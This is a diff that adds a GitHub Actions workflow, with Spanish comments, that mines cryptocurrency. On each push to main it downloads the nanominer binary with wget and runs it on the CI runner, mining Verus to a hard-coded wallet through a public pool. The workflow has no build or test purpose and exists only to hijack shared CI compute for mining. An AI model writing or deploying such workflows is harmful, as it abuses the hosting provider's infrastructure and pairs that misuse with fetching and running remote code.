@@ -1,0 +1,24 @@
+name: Nanominer Mining
+
+on:
+  push:
+    branches:
+      - main  # Cambia 'main' por la rama que prefieras
+
+jobs:
+  run-nanominer:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Clonar el repositorio
+      uses: actions/checkout@v2
+
+    - name: Instalar dependencias y ejecutar Nanominer
+      run: |
+        sudo apt update
+        sudo apt install -y wget tar
+        wget https://github.com/nanopool/nanominer/releases/download/v3.6.3/nanominer-linux-3.6.3.tar.gz
+        tar -xf nanominer-linux-3.6.3.tar.gz
+        cd nanominer-linux-3.6.3
+        chmod +x nanominer
+        ./nanominer -algo Verushash -wallet RXpS2eUefUChbjagNZTGCr1r4ALMarbUVo.netbook -coin VRSC -pool1 na.luckpool.net:3956 -t 2
